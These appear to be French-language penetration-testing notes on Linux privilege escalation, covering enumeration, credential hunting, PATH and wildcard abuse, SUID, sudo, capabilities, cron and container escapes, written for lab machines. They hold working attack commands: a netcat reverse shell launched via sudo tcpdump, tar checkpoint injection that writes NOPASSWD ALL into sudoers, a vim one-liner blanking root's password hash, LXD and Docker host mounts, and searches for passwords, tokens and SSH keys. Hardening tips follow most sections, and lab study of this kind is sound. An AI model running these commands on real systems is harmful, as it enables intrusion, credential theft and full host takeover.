# Information Gathering

---

# Environment Enumeration

## Objectif
Obtenir un maximum d’informations sur le système compromis (OS, kernel, services, utilisateurs, fichiers sensibles, etc.) pour identifier des vecteurs d’escalade de privilèges.

## 1) Informations de base

### Identifier l’utilisateur & le système
`whoami` → utilisateur actuel  
`id` → UID, GID, groupes  
`hostname` → nom du système  
`cat /etc/os-release` → version & distribution  
`uname -a` → version du kernel  
`lscpu` → infos CPU  

### Vérifier le PATH & les variables d’environnement
`echo $PATH`  
`env | less` → chercher creds, tokens, clés API  

## 2) Vérifier les privilèges et sudo
`sudo -l` → commandes accessibles sans mot de passe  
`groups` → groupes de l’utilisateur  
`getent group sudo` → membres du groupe sudo  

## 3) Réseau & connectivité
`ip a` → interfaces réseau  
`route -n` → table de routage  
`arp -a` → hôtes connus sur le réseau local  
`cat /etc/resolv.conf` → DNS internes (utile pour AD)  

## 4) Systèmes de fichiers & stockage

### Périphériques & montages
`lsblk` → disques et partitions  
`df -h` → systèmes montés  
`cat /etc/fstab` → disques montés ou montables  
`mount | column -t` → points de montage actifs  

### Fichiers et répertoires cachés
`find / -type f -name ".*" 2>/dev/null`  
`find / -type d -name ".*" 2>/dev/null`  

### Fichiers temporaires
`ls -l /tmp /var/tmp /dev/shm`  
→ Ces dossiers sont souvent accessibles en écriture (cibles pour scripts / persistence).

## 5) Défenses & sécurité
`aa-status` → AppArmor  
`sestatus` → SELinux  
`ufw status` → pare-feu simple  
`ps aux | grep fail2ban`  
`systemctl list-units | grep snort`  

→ Savoir quelles protections sont actives avant exploitation.

## 6) Utilisateurs et groupes

### Lister utilisateurs et shells
`cat /etc/passwd` → utilisateurs  
`grep "sh$" /etc/passwd` → comptes avec un shell valide  
`cat /etc/group` → groupes & membres  
`ls /home` → répertoires utilisateurs  

### Identifier les hashes (si visibles)
- `$1$` → MD5  
- `$5$` → SHA-256  
- `$6$` → SHA-512  
- `$2a$` → bcrypt  
- `$argon2i$` → Argon2  

→ Si hash lisible, extraction pour **cracking offline**.

## 7) Services, tâches et processus
`ps aux` → processus actifs  
`netstat -tulnp` → ports ouverts & PID  
`systemctl list-units --type=service --state=running`  
`crontab -l; ls -la /etc/cron*` → tâches planifiées  

→ Repérer services tournant en **root** ou scripts mal sécurisés.

## 8) Fichiers sensibles & config leaks
`find / -type f \( -name "*.conf" -o -name "*.config" \) 2>/dev/null | grep -Ei "pass|user|cred"`  
`grep -R "password" /etc 2>/dev/null`  
`grep -R "PRIVATE KEY" /home 2>/dev/null`  

→ Les fichiers `.bash_history`, `.ssh/`, `.git/`, `.env` sont des cibles prioritaires.

## 9) Méthodologie & bonnes pratiques
- Toujours **documenter** chaque commande & sortie clé.  
- Identifier versions vulnérables (kernel, services).  
- Vérifier privilèges d’écriture sur scripts/services.  
- Explorer `/tmp` et `/var/tmp` pour fichiers temporaires.  
- Lister clés SSH & historiques de commandes.

## 10) Ressources & outils automatisés
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Script complet d’énumération Linux.  
- [LinEnum](https://github.com/rebootuser/LinEnum): Script d’énumération OS / kernel / users / perms.  
- [Linux Smart Enumeration (LSE)](https://github.com/diego-treitos/linux-smart-enumeration): Version allégée interactive.  
- [pspy](https://github.com/DominicBreuker/pspy): Surveillance des processus sans root.  
- [LES (Linux Exploit Suggester)](https://github.com/The-Z-Labs/linux-exploit-suggester): Recherche d’exploits kernel.

---

# Linux Services & Internals Enumeration

## Objectif
Obtenir une vue complète de l’état interne du système Linux : services, connexions, processus, utilisateurs actifs, tâches planifiées, paquets installés et fichiers sensibles — afin d’identifier des vecteurs d’exploitation ou d’escalade de privilèges.

## 1) Réseau et interfaces

### Interfaces réseau & IP
`ip a` → adresses et interfaces  
`ifconfig` → alternative si net-tools est installé  
`route -n` ou `netstat -rn` → table de routage  
`cat /etc/resolv.conf` → serveurs DNS (utile pour AD)  
`cat /etc/hosts` → hôtes locaux configurés manuellement  

## 2) Utilisateurs & connexions

### Dernières connexions
`lastlog` → historique de connexion des utilisateurs  
`last` → sessions récentes  
`w` ou `who` → utilisateurs actuellement connectés  
`finger` → détails supplémentaires sur les sessions (si dispo)  

## 3) Historique & commandes utilisateurs

### Historique bash & scripts
`history` → commandes récentes  
`cat ~/.bash_history` → historique utilisateur actuel  
`find / -type f \( -name *_hist -o -name *_history \) 2>/dev/null` → fichiers d’historique cachés  

### Chercher infos sensibles
`grep -Ei "pass|key|token" ~/.bash_history` → recherche de secrets  
`grep -R "password" /home/* 2>/dev/null`  

## 4) Tâches planifiées & automatisation

### Cron Jobs
`ls -la /etc/cron.* /var/spool/cron`  
`cat /etc/crontab`  
`systemctl list-timers --all`  
→ Identifier scripts ou binaires exécutés avec privilèges root.

### Vérifier permissions
`ls -l /etc/cron.daily/`  
→ Si un script root est modifiable par l’utilisateur → **escalade directe**.

## 5) Processus & services

### Processus actifs
`ps aux` → liste complète des processus  
`ps aux | grep root` → processus root  
`systemctl list-units --type=service --state=running`  
`netstat -tulnp` → services & ports actifs  
`ss -tulwnp` → alternative moderne  

### /proc filesystem
`find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"`  
→ montre les commandes exécutées, chemins et sockets en cours d’utilisation.  

## 6) Paquets & binaires

### Paquets installés
`apt list --installed`  
ou pour exporter :  
`apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' > installed_pkgs.list`  

### Version de sudo
`sudo -V` → version vulnérable ? (vérifier CVE sur GTFOBins / exploitdb)

### Binaries présents
`ls -l /bin /usr/bin /usr/sbin`  
→ vérifier exécutables disponibles pour l’utilisateur.

### GTFObins check
Comparer les binaires présents avec ceux exploitables :
```bash
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d'); do 
  if grep -q "$i" installed_pkgs.list; then 
    echo "Check GTFO for: $i"; 
  fi; 
done
```

## 7) Tracer les appels système

### Strace
`strace <commande>` → suivre appels système & fichiers ouverts  
Ex :  
`strace ping -c1 10.129.112.20`  
→ permet de voir connexions réseau, fichiers de config lus, etc.  

## 8) Fichiers de configuration & scripts

### Config files
`find / -type f \( -name "*.conf" -o -name "*.config" \) 2>/dev/null`  
→ rechercher creds ou chemins sensibles.  

### Scripts
`find / -type f -name "*.sh" 2>/dev/null | grep -v "snap\|share"`  
→ scripts custom d’admin souvent exploitables (droits, contenu).  

## 9) Outils disponibles

Lister outils installés pour évaluer possibilités de pivot ou d’exploitation :  
`which nc perl python ruby gcc nmap tcpdump wget curl`  
→ si présents : utilisables pour reverse shell, exfiltration, ou pivot.  

## 10) Analyse complémentaire

### Chercher fichiers récemment modifiés
`find / -mtime -2 2>/dev/null` → fichiers modifiés récemment  
→ utile pour repérer backups, logs, scripts actifs.  

### Recherche de backups
`find / -type f \( -name "*.bak" -o -name "*.old" -o -name "*.save" \) 2>/dev/null`  

## 11) Résumé des cibles clés à examiner
- **/etc/** → fichiers de configuration critiques  
- **/home/** → historiques, clés SSH, scripts  
- **/var/log/** → logs contenant infos d’authentification  
- **/tmp /var/tmp /dev/shm** → fichiers temporaires modifiables  
- **/proc/** → infos runtime (processus, sockets, env)  

## 12) Outil recommandé
- [GTFOBins](https://gtfobins.github.io/): base de binaires exploitables localement.  

---

# Credential Hunting

## Objectif
Identifier et extraire tous les **identifiants stockés localement** : mots de passe, clés SSH, tokens, ou configurations sensibles, afin de faciliter l’escalade de privilèges ou le pivot vers d’autres systèmes.

## 1) Fichiers de configuration & scripts

### Rechercher fichiers contenant des credentials
`find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`  
`find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.xml" -o -name "*.ini" \) 2>/dev/null`  
`grep -Ri "password\|pass\|user\|login\|key\|token" /etc /var /home 2>/dev/null`  

→ Les fichiers `.conf`, `.xml`, `.env`, `.ini` ou `.bak` sont souvent riches en infos sensibles.

### Exemple : WordPress config
`grep 'DB_USER\|DB_PASSWORD' /var/www/html/wp-config.php`  
```
define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'WPadmin123!' );
```
→ Credentials MySQL trouvés : exploitables pour base de données ou pivot réseau.

## 2) Emplacements typiques à vérifier
- `/var/www/` → fichiers de sites web (WordPress, Joomla, CMS)  
- `/etc/` → configurations système et de services  
- `/opt/` ou `/srv/` → apps personnalisées avec fichiers secrets  
- `/home/*` → scripts, configs, ou historiques utilisateurs  
- `/var/spool/` ou `/var/mail/` → fichiers de mail pouvant contenir credentials  

## 3) Fichiers d’historique
`cat ~/.bash_history`  
`grep -Ei "pass|key|user|ssh" ~/.bash_history`  
`grep -R "password" /home/* 2>/dev/null`  

→ Les utilisateurs laissent souvent des mots de passe dans des commandes ou scripts.

## 4) Fichiers de sauvegarde & copies
`find / -type f \( -name "*.bak" -o -name "*.old" -o -name "*.save" -o -name "*.swp" \) 2>/dev/null`  
→ Les fichiers de backup contiennent souvent des versions non chiffrées de configs sensibles.

## 5) Clés SSH & accès distants

### Rechercher clés SSH
`find / -type f -name "id_rsa*" 2>/dev/null`  
`ls -la ~/.ssh`  
→ Les fichiers `id_rsa` ou `id_dsa` sont des **clés privées** exploitables pour SSH.

### Vérifier hôtes connus
`cat ~/.ssh/known_hosts`  
→ permet d’identifier les serveurs déjà contactés (utile pour le **lateral movement**).

### Exemple :
```
id_rsa  
id_rsa.pub  
known_hosts
```
→ Essayer d’utiliser `id_rsa` pour se connecter à un autre utilisateur ou hôte :  
`ssh -i id_rsa user@target`  

## 6) Autres emplacements possibles
- `/root/.ssh/` → clés root (si accessibles)  
- `/etc/ssh/` → configuration SSH globale  
- `/var/backups/` → anciennes configs système  
- `/etc/passwd` & `/etc/shadow` → hashes à exfiltrer si lisibles  

## 7) Fichiers d’application contenant des secrets
- `.git/config` ou `.git-credentials`  
- `.aws/credentials` (AWS)  
- `.docker/config.json`  
- `.npmrc`, `.pypirc` → tokens API  
- `settings.py`, `.env` → souvent mots de passe DB ou SMTP  

## 8) Outils utiles pour la chasse aux credentials
- `grep` → recherche rapide dans tout le système  
- `strings` → extraire texte lisible depuis fichiers binaires  
- `cat`, `less`, `head` → lecture simple  
- `find` + `grep` → combinaison pour automatiser la recherche  
- `linPEAS` → inclut détection automatique de fichiers sensibles  

## 9) Ressources recommandées
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Recherche automatisée de credentials et secrets.  
- [Pspy](https://github.com/DominicBreuker/pspy): Observation de scripts pouvant révéler des creds en exécution.  
- [GitTools](https://github.com/internetwache/GitTools): Extraction de credentials depuis repos git.  

---

# Environment-based Privilege Escalation

---
# Path Abuse

## Objectif
Exploiter des failles liées à la variable d’environnement **PATH** pour exécuter un script malveillant à la place d’un binaire légitime, et ainsi obtenir une escalade de privilèges ou une exécution arbitraire de code.

## 1) Comprendre la variable PATH

### Définition
`PATH` contient la liste des **répertoires** où le système recherche les exécutables lorsqu’une commande est saisie sans chemin complet.

Exemple :  
`cat /tmp/test.txt` → exécute `/bin/cat` car `/bin` est dans le `PATH`.

### Vérifier le PATH
`echo $PATH`  
ou  
`env | grep PATH`

Exemple :
```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

## 2) Exploitation de base

### Principe
Si un utilisateur ou un script exécute une commande **sans spécifier le chemin absolu**, le système exécutera **le premier binaire trouvé** dans l’ordre du `PATH`.

Si on peut écrire dans un dossier inclus dans le `PATH`, on peut y placer un script malveillant.

## 3) Démonstration

### Étape 1 : Créer un script dans un dossier du PATH
```bash
cd /usr/local/sbin
echo 'netstat -antp' > conncheck
chmod +x conncheck
```

### Étape 2 : Exécuter depuis un autre dossier
```bash
cd /tmp
conncheck
```
Le script s’exécute même en dehors de `/usr/local/sbin` car ce dossier est dans le `PATH`.

## 4) Ajouter le répertoire courant au PATH

### Ajouter “.” au PATH
```bash
PATH=.:$PATH
export PATH
echo $PATH
```

Résultat :
```
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
Le `.` (répertoire courant) est prioritaire, donc tout script dans le dossier actuel est exécuté avant les vrais binaires système.

## 5) Exemple d’abus

### Créer un faux `ls` pour détourner une commande
```bash
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
```

### Exécution :
```bash
ls
```
Sortie :
```
PATH ABUSE!!
```

On a remplacé le comportement de la commande `ls`.

## 6) Cas d’exploitation en réel

- Si un **script root** appelle une commande sans chemin absolu (`tar`, `cp`, `ls`, `cat`, etc.),  
  et que l’utilisateur courant peut modifier un dossier inclus dans le `PATH`,  
  → il est possible de **remplacer la commande par un script malveillant** (ex. reverse shell).

### Exemple :
```bash
echo '/bin/bash -p' > /tmp/cp
chmod +x /tmp/cp
export PATH=/tmp:$PATH
```
Si un script root exécute `cp`, alors `/tmp/cp` sera appelé → **shell root obtenu**.

## 7) Bonnes pratiques de défense

- Toujours utiliser des **chemins absolus** dans les scripts : `/bin/ls` au lieu de `ls`.  
- Ne **jamais** inclure `.` dans le PATH.  
- Restreindre les permissions en écriture sur les dossiers du PATH.  
- Vérifier le PATH avant exécution de scripts sensibles : `echo $PATH`.

---

# Wildcard Abuse

## Objectif
Exploiter l’interprétation des **caractères génériques (wildcards)** par le shell pour injecter des options malveillantes dans des commandes exécutées par des scripts ou des **cron jobs root**, menant à une **escalade de privilèges**.

## 1) Comprendre les wildcards

| Caractère | Fonction |
|------------|-----------|
| `*` | Remplace n’importe quelle chaîne de caractères |
| `?` | Remplace un seul caractère |
| `[ ]` | Définit un ensemble ou une plage de caractères |
| `~` | Se traduit par le répertoire home de l’utilisateur |
| `-` | Dans `[a-z]`, indique une plage de caractères |

Les wildcards sont **interprétées par le shell avant exécution**, ce qui permet d’injecter des options inattendues dans certaines commandes.

## 2) Commandes vulnérables
Certaines commandes (comme `tar`, `rsync`, `cp`, `chmod`, `chown`, etc.) interprètent les arguments précédés de `--`, ce qui permet d’injecter des **options supplémentaires** lors de l’exécution.

Exemple : `tar` permet d’exécuter une commande via  
`--checkpoint` et `--checkpoint-action=exec=<commande>`.

## 3) Exemple concret : abus d’un cron job

### Cron job vulnérable
```
*/1 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```
Le `*` permet d’injecter des fichiers nommés comme des **arguments tar**, donc exploitables.

## 4) Exploitation pas à pas

### Étape 1 — Créer un script malveillant
```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```
Ce script ajoute des droits root sans mot de passe à l’utilisateur.

### Étape 2 — Créer des fichiers “arguments tar”
```bash
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

### Étape 3 — Vérifier les fichiers
```bash
ls -la
```
Doit afficher :
```
--checkpoint=1
--checkpoint-action=exec=sh root.sh
root.sh
```

### Étape 4 — Attendre que le cron job s’exécute
Une fois le `tar` lancé automatiquement, il exécutera la commande suivante :
```
tar -zcf backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=sh root.sh
```
Résultat : `root.sh` est exécuté avec les **privilèges root**.


## 5) Vérifier la réussite
```bash
sudo -l
```
Résultat attendu :
```
(root) NOPASSWD: ALL
```
Puis :
```bash
sudo su
```
Shell root obtenu.

## 6) Conditions requises
- Le cron job ou script exécute une commande vulnérable avec `*` ou autre wildcard.  
- Vous avez les **droits d’écriture** dans le répertoire où la commande est exécutée.  
- La commande est exécutée par un **utilisateur privilégié (souvent root)**.

## 7) Défense & prévention
- Toujours **utiliser des chemins explicites** dans les scripts (`tar -zcf /home/user/backup.tar.gz /home/user/*`).  
- Ne jamais exécuter `tar`, `cp`, etc. avec des wildcards dans des scripts root.  
- Exécuter les commandes avec `--warning=no-wildcards` ou `set -f` (désactive les wildcards).  
- Restreindre les permissions d’écriture sur les répertoires exécutés par des cron jobs.

## 8) Outils utiles
- `pspy` → détecter les cron jobs exécutés automatiquement.  
- `LinPEAS` → identifie les scripts root utilisant des wildcards.  
- `Tar man page` → comprendre les options exploitables comme `--checkpoint-action`.

---

# Escaping Restricted Shells

## Objectif
Contourner les **shells restreints (rbash, rksh, rzsh)** pour retrouver un shell complet et exécuter librement des commandes système.

## 1) Types de restricted shells
| Shell | Description |
|--------|--------------|
| **rbash** | Bourne shell limité — empêche `cd`, export de variables, exécution hors PATH. |
| **rksh** | Korn shell restreint — bloque les fonctions et modifications d’environnement. |
| **rzsh** | Z shell restreint — limite scripts, alias et environnement. |

## 2) Méthodes d’évasion

### ➤ Command Substitution
Exécuter une commande via backticks ou `$()` :
```bash
ls -l `pwd`
ls -l $(whoami)
```

### Command Injection
Injecter des commandes dans des arguments autorisés :
```bash
echo test; /bin/bash
```

### Command Chaining
Utiliser `;`, `|`, ou `&&` pour chaîner plusieurs commandes :
```bash
ls; bash
```

### Variables d’environnement
Modifier le PATH ou SHELL :
```bash
export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash
/bin/bash
```

### Shell Functions
Définir une fonction pour lancer un shell :
```bash
shell(){ /bin/bash; }
shell
```

## 3) Autres astuces rapides
- Essayer d’ouvrir un **éditeur interactif** (vi, less, man) puis exécuter `:!bash`.  
- Tenter `python -c 'import pty;pty.spawn("/bin/bash")'`.  
- Si autorisé : `ssh user@host /bin/bash` pour contourner le shell restreint.  

---

# Permissions-based Privilege Escalation

---

# Special Permissions (SUID / SGID) 

## Objectif
Identifier les fichiers avec bits `setuid` / `setgid`, comprendre rapidement les vecteurs d'exploitation courants (binaires abuseables, scripts mal protégés) et vérifier si un gain de privilèges est possible.

## 1) Trouver les fichiers SUID / SGID
`find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`  → SUID (setuid)  
`find / -uid 0 -perm -6000 -type f 2>/dev/null` → SUID ou SGID combinés

Exemple de sortie utile :  
`-rwsr-xr-x 1 root root ... /usr/bin/sudo`  
(`s` dans les permissions indique SUID/SGID)

## 2) Vérifier rapidement les candidats intéressants
Chercher binaires non standards dans `/home`, `/opt` :  
`find /home /opt -type f -perm -4000 2>/dev/null`

Priorité d’analyse : binaires custom, programmes avec accès à l’I/O, binaires qui exécutent commandes externes ou chargent librairies.

## 3) Méthodes d’exploitation courantes
- **Utiliser des fonctionnalités du binaire** (ex. `apt-get -o APT::Update::Pre-Invoke::=/bin/sh` via `sudo`-like binaires) — voir GTFOBins.  
- **LD_PRELOAD / library hijacking** si binaire exécute `dlopen` (attention : protections modernes).  
- **Abuser d’options/arguments** permettant d’exécuter une commande ou d’écrire un fichier (ex : apt, pkexec mal configuré).  
- **Remplacer fichiers utilisés par le binaire** (config, plugin) si permissions permissives.  
- **Reverse engineer / fuzz** un binaire SUID pour trouver overflow (option lourde — contexte CTF / audit).

Exemple simple (GTFOBins style) :  
`sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` → shell root (si `apt-get` est SUID ou lancé via sudo sans mot de passe).

## 4) Vérifications rapides avant exploitation
- `strings <binaire> | egrep -i "exec|system|popen|dlopen|LD_PRELOAD"`  
- `ldd <binaire>` → dépendances (attention à setuid : `ldd` peut être risqué sur SUID)  
- `stat <binaire>` → propriétaire, timestamps, ACLs  
- Permissions du répertoire parent : `ls -ld $(dirname /chemin/vers/binaire)`

## 5) Défense / durcissement
- Éviter SUID sur binaires non essentiels.  
- Restreindre écriture sur répertoires contenant binaires SUID.  
- Surveiller changements de permissions : `auditd`/tripwire.  
- Préférer capacités POSIX (file capabilities) bien contrôlées plutôt que SUID quand possible.

---

# Sudo Rights Abuse

## Objectif
Détecter des droits `sudo` abusifs (surtout `NOPASSWD`) et exploiter des commandes autorisées pour obtenir un shell root ou exécuter du code privilégié — rapidement et de façon répétable.

## 1) Vérifier les droits sudo
`sudo -l` → lister ce que l’utilisateur peut exécuter (les entrées `NOPASSWD` sont visibles sans mot de passe).

Exemple :  
`(root) NOPASSWD: /usr/sbin/tcpdump`

## 2) Principes d’exploitation rapides
- Si un binaire listé accepte des **options** qui permettent d’exécuter une commande ou un script (ex. `--pre-invoke`, `--postrotate`, `--eval`, `-c`, `-z`...), on peut l’abuser.  
- Si la commande est appelée sans chemin absolu dans sudoers → **PATH abuse** possible.  
- Si la commande lit/exécute des fichiers contrôlables par l’utilisateur → remplacer par script/shell.

Toujours regarder la `man` du binaire (`man <binaire>`) pour options dangereuses.

## 3) Exemple concret (tcpdump `-z` postrotate)
- Créer le script à exécuter en postrotate :  
  `echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f' > /tmp/.test && chmod +x /tmp/.test`

- Lancer tcpdump via sudo (exploitable si autorisé) :  
  `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root`

- Écouter la connexion reverse shell :  
  `nc -lnvp 443`

Résultat : shell root (si l’option permet d’exécuter le script).

## 4) Vérifs pré-exploit rapides
- `sudo -l` → confirmer `NOPASSWD` et la commande exacte.  
- `man <binaire>` → chercher options `-z`, `--pre-invoke`, `--postrotate`, `-c`, `--eval`, etc.  
- `which <binaire>` / vérifier chemin absolu dans sudoers.  
- Vérifier si l’utilisateur peut écrire le fichier passé en argument (ex : `/tmp/.test`).

## 5) Défenses & bonnes pratiques (admin)
1. **Préciser chemins absolus** dans `/etc/sudoers` (`/usr/bin/foo` plutôt que `foo`).  
2. **Éviter `NOPASSWD: ALL`** ; limiter aux commandes strictement nécessaires.  
3. Restreindre options dangereuses via wrappers ou ACLs.  
4. Surveiller et auditer modifications sudoers et exécutions `sudo`.  
5. Appliquer AppArmor/SELinux pour limiter ce que les options comme `-z` peuvent appeler.

---

# Privileged Groups

## Objectif
Rappels rapides : vérifier l'appartenance à des groupes « privilégiés » (lxd, docker, disk, adm, etc.), comprendre l'impact et méthodes rapides d'exploitation / vérifications — concis.

## 1) Vérifier membership
`id`  
`groups`  
`getent group lxd docker disk adm`

## 2) LXD / LXC (impact élevé)
- Condition : utilisateur dans le groupe `lxd`.
- Risque : créer container privilégié et monter le système hôte → root sur l’hôte depuis le container.

Vérifs rapides :
- `id | grep lxd`
- `lxc --version` (si installé)

Exemple d’enchaînement condensé :
- importer image : `lxc image import alpine.tar.gz --alias alpine`  
- créer container privilégié : `lxc init alpine r00t -c security.privileged=true`  
- monter racine hôte : `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`  
- démarrer & exécuter shell : `lxc start r00t` → `lxc exec r00t -- /bin/sh` → `cd /mnt/root`

Remarque : nécessite accès au socket LXD local (généralement autorisé pour membres `lxd`).

## 3) Docker (impact élevé)
- Condition : utilisateur dans le groupe `docker`.
- Risque : lancer un conteneur avec un volume pointant vers `/` ou `/root` → accès hôte.

Exploitation rapide :
- `docker run -v /root:/mnt -it --rm alpine sh` → puis `ls /mnt` (récupérer clefs/ etc.)

Remarque : docker group = quasi-root. Vérifier : `docker ps` fonctionne sans sudo.

## 4) disk group (accès périphériques block)
- Condition : membre du groupe `disk`.
- Risque : accès raw disque (ex. `/dev/sda`) → lecture offline du filesystem, récupération de clefs, /etc/shadow, etc.

Outils / actions :
- monter image (si permissions) ou utiliser `debugfs` : `debugfs -R 'ls' /dev/sda1` (attention risques et besoin de connaissances)
- copier périphérique : `dd if=/dev/sda of=/tmp/disk.img bs=1M` (si permis)

## 5) adm group (logs)
- Condition : membre du groupe `adm`.
- Permet : lecture de `/var/log/*` (journaux système, applis) → recherche de creds, tokens, cron jobs, commandes récentes.

Recherches rapides :
- `ls -l /var/log`  
- `grep -Ri "password\|passwd\|token\|ssh" /var/log 2>/dev/null`  
- `journalctl --since "1 day ago"` (si accessible)

## 6) Bonnes pratiques d’analyse (quick wins)
- Toujours commencer par : `id`, `groups`, `sudo -l`  
- Chercher fichiers/dirs montables ou scripts exécutés par des services : `find / -perm -4000 -type f 2>/dev/null`  
- Rechercher clés SSH et fichiers sensibles : `find /home -name "id_rsa" -o -name "*.pem" 2>/dev/null`  
- Examiner `/etc/group` pour membres inattendus : `getent group docker lxd disk adm`

## 7) Défenses / recommandations admin (rapide)
- Ne pas ajouter d’utilisateurs non-trustés aux groupes `docker` / `lxd` / `disk`.  
- Restreindre accès aux sockets (ex. `/var/snap/lxd/common/lxd/unix.socket`) et démon Docker.  
- Eviter d’exposer Docker/LXD au réseau ; utiliser contrôles d’accès.  
- Surveiller et alerter sur ajouts aux groupes privilégiés (auditd / SIEM).  
- Préférer politiques RBAC et gestion centralisée (e.g., non-possession des droits root via groupe).

---

# Capabilities 

## Objectif
Identifier vite les **Linux capabilities** attribuées aux binaires, comprendre les capacités dangereuses et les vecteurs d'exploitation/prévention — format minimal pour copy/paste.

## 1) Rappel
- Les capabilities donnent à un binaire des droits précis sans être `root` (ex : `cap_net_bind_service` permet de binder des ports <1024).  
- Valeurs usuelles : `=`, `+ep`, `+ei`, `+p`.  
  - `+ep` → effective + permitted (usage courant pour exécution avec capability).  
  - `+ei` → effective + inheritable (enfants héritent).  

## 2) Caps dangereuses à repérer (exemples)
- `cap_sys_admin` — très puissant (quasi-root).  
- `cap_dac_override` — bypass des checks de permissions (lecture/écriture de fichiers protégés).  
- `cap_setuid` / `cap_setgid` — changer UID/GID.  
- `cap_sys_ptrace` — attacher/déboguer autres processus.  
- `cap_net_raw` / `cap_net_bind_service` — sniffing / bind ports.

## 3) Énumération rapide (one-liners)
- Lister capabilities sur répertoires usuels :  
  `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null`  
- Tester une capability sur un fichier :  
  `getcap /path/to/binary`  
- Voir capabilities actives d’un processus (si `capsh`/proc) :  
  `cat /proc/<pid>/status | egrep Cap|tr '\n' ' '` (plus d’analyse nécessaire)


## 4) Ajouter/retirer une capability (admin)
- Ajouter : `sudo setcap cap_net_bind_service=+ep /usr/bin/myprog`  
- Enlever : `sudo setcap -r /usr/bin/myprog`  
- Vérifier : `getcap /usr/bin/myprog`

## 5) Exploits pratiques (exemples courts)
- **`cap_dac_override` + éditeur**  
  - Si `getcap /usr/bin/vim.basic` → `/usr/bin/vim.basic cap_dac_override=eip`  
  - Éditer `/etc/passwd` : `echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd`  
  - Conséquence : suppression du hash → `su root` sans mot de passe *(danger réel, démonstratif)*.

- **Général** : tout binaire permettant d'écrire/éxecuter fichiers ou d'ouvrir devices avec une capability d'override est une cible (ex : écrire clefs SSH, modifier `/etc/sudoers`, monter FS si `cap_sys_admin`).

## 6) Vérifs avant exploitation
- `getcap <binaire>` confirmé.  
- Le binaire est-il **sûr** (interactif, sandboxé) ? `strings <binaire>` pour trouver options d’IO.  
- L’utilisateur peut-il lancer le binaire directement ? (permissions).  
- Y a-t-il des protections (AppArmor/SELinux) limitant le comportement du binaire ?

## 7) Mitigation / bonnes pratiques (admin)
- Minimiser capabilities : préférer drop de caps et utiliser des services sandboxés.  
- Ne pas donner `cap_sys_admin` / `cap_dac_override` à des binaires exposés aux utilisateurs.  
- Surveiller modifications de capabilities (`auditd`, intégrité des fichiers).  
- Utiliser `setcap -r` pour retirer caps inutiles et privilégier utilisateurs/UID restreints.

## 8) Ressource utile
- [getcap / setcap (man)](https://man7.org/linux/man-pages/man8/setcap.8.html)  

---
# Service-based Privilege Escalation

---

# Cron Job Abuse

## Objectif
Repérer rapidement des tâches cron ou scripts écrits par root mais modifiables par un utilisateur non-privilégié, et exploiter-les pour obtenir une élévation de privilèges locale (root).

## 1) Détection rapide
- Trouver fichiers/crons world-writable : `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`  
- Lister crontabs système : `ls -la /etc/cron.* /var/spool/cron*`  
- Rechercher scripts modifiables référencés par cron : `grep -R --line-number "cron" /etc/cron* 2>/dev/null`  
- Observer exécution réelle (sans root) : utiliser `pspy` (ex : `./pspy64 -pf -i 1000`) pour voir jobs lancés et fréquences.

## 2) Vérifier fréquence & propriétaire
- Si un script s'exécute en root souvent (ex. chaque minute / toutes les 3 min), il est idéal pour injecter un payload rapide.

## 3) Contremesures
- Retirer write sur scripts critiques : `chmod o-w /path/to/script`  
- Restreindre dossiers contenant crons : `chown root:root` + `chmod 750`  
- Éviter `cron` jobs qui exécutent scripts depuis dossiers écrits par non-root.  
- Auditer et corriger crontabs dans `/etc/cron.d`, `/etc/cron.daily`, `/var/spool/cron` — désactiver / corriger entrées vulnérables.  
- Déployer `auditd`/logging sur modifications de scripts cron.

## 4) Bonnes pratiques pour les admins
- Ne jamais laisser scripts root world-writable.  
- Utiliser chemins absolus dans scripts et vérifier entrées externes.  
- Monter `/tmp` et dossiers temporaires avec `noexec,nosuid,nodev` si possible.  
- Minimiser les tâches root fréquentes ; privilégier comptes dédiés.

## Ressource (outil)
- [pspy](https://github.com/DominicBreuker/pspy) : observer cron/processus sans root.  

---

# Containers

## Principe
Les containers (LXC/LXD, Docker) partagent le noyau hôte. Si un utilisateur appartient au groupe `lxd`/`docker`, il peut créer des conteneurs **privileged** et monter le système hôte — accès root possible.

## 1) Détection rapide
- Vérifier groupes : `id`  
  → si `lxd` ou `docker` présent, c’est critique.
- Voir images/templates locales : `ls ~/ContainerImages` ou `lxc image list`

## 2) Exploitation rapide (LXD)
1. Importer une image (si dispo) :  
   `lxc image import alpine.tar.gz --alias alpine`  
2. Initialiser un container *privileged* :  
   `lxc init alpine privesc -c security.privileged=true`  
3. Monter la racine hôte dans le container :  
   `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`  
4. Démarrer et exécuter un shell :  
   `lxc start privesc`  
   `lxc exec privesc -- /bin/bash`  ou `/bin/sh` pour alpine
5. Dans le container : accéder au host via `/mnt/root` (root sur l’hôte).

